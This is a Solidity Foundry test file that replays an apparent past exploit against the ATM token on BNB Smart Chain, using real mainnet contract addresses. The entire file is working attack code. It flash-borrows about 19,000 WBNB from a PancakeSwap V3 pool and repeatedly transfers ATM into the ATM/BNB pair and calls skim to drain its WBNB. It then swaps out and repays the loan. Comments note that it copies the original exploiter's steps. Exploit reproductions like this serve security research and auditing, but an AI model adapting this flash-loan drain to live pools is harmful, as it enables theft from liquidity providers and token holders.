// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

contract AtmTest is Test {
    // USDT/BNB
    IPancakePairV3 USDT_BNB_Pool =
        IPancakePairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);

    IPancakeRouterV2 PANCAKE_V2_ROUTER =
        IPancakeRouterV2(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePairV2 ATM_BNB_Pool =
        IPancakePairV2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);

    uint256 BorrowBNB = 18_993 ether;

    function setUp() public {
        vm.createSelectFork("bsc", 37483301 - 1);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("[start] BNB", WBNB.balanceOf(address(this)), 18);

        BorrowBNB = WBNB.balanceOf(address(USDT_BNB_Pool)) - 1e18;
        // print("BorrowBNB", BorrowBNB, 18);
        // BorrowBNB: 18_993
        USDT_BNB_Pool.flash(address(this), 0, BorrowBNB, "");

        print("[end] BNB", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(
        uint256 /* fee0 */,
        uint256 fee1,
        bytes calldata /* data */
    ) external {
        // print("amount BNB to USDT", BNB.balanceOf(address(this)) - 170 ether, 18);
        // amount BNB to USDT: 18_823.184639924141452117
        ATM.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
        WBNB.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
        USDT.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);

        token2token(
            address(WBNB),
            address(USDT),
            WBNB.balanceOf(address(this)) - 170 ether
        );

        uint256 lp;
        for (uint256 index = 0; index < 2; index++) {
            // amount BNB to ATM
            token2token(address(WBNB), address(ATM), 70 ether);
            while (lp < 100) {
                uint256 pair_lost = lostPair();
                if (pair_lost == 7) {
                    break;
                }
                lp++;
            }
        }

        // To get max profit, not good at math so just copy the exploiter's work
        lp = 0;
        while (lp < 15) {
            uint256 pair_lost = lostPair();
            if (pair_lost == 0) {
                break;
            }
            lp++;
        }

        token2token(address(ATM), address(WBNB), ATM.balanceOf(address(this)));
        token2token(
            address(USDT),
            address(WBNB),
            USDT.balanceOf(address(this))
        );

        WBNB.transfer(address(USDT_BNB_Pool), BorrowBNB + fee1);
    }

    function lostPair() public returns (uint256) {
        uint256 pair_wbnb = WBNB.balanceOf(address(ATM_BNB_Pool));
        ATM.transfer(address(ATM_BNB_Pool), ATM.balanceOf(address(this)));
        ATM_BNB_Pool.skim(address(this));
        (, uint wbnb_r, ) = ATM_BNB_Pool.getReserves();
        uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
        // console.log("Pair lost:", pair_lost);
        return pair_lost;
    }

    function token2token(address a, address b, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);

        PANCAKE_V2_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }
}
